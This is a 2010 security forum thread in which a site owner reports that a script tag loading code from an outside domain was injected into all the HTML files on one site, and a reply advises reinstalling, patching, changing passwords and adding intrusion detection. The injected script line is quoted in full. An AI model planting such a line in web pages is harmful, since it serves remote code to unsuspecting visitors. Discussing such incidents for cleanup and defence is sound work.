---
title: "1webmall.com - How did it get there? How do I prevent?"
date: 2010-02-17
forum: Security
---

### Post by razorbuzz on 2010-02-17
Hello.  I have a server setup serving multiple sites via ISPConfig.  I've searched the forums there and over here, but to no avail.

The problem:  One of the sites was reported as an attack site via Google's warning setup.  The problem is ```
<script src=http://1webmall.com/images/Global.php ></script>
``` has appeared inside every HTML file on this single website. I've manually removed it from every page in every subdirectory, but it leaves me wondering - how did it get there, and how can I prevent it from happening again?   Only the HTML's got it. No HTM, PHP, txt nor any other type.

There are 6 sites on this machine, this is the only one this has happened to.  I know it was not placed there by the site owner (as the site that got it just happens to be my own! :icon_frown: ).  I've searched all over for other sites this has happened to, but with Google listing them as attack sites they don't show up in most search results either (even on other search engines).

Anybody have any ideas on this?  Have you seen this before? 

Thanks in advance.
-Razor

---

### Post by bodhi.zazen on 2010-02-17
Sounds like you have been cracked. Could be via any number of things, from a problem server side to a problem on your clients or a cracked ftp server, hard to know from the information you posted.

If you do not know I suggest you back up your data and reinstall the OS, make sure everything is up to date, change your passwords, and review what servers are running.

I would also consider installing a HIDS such as OSSEC.

---

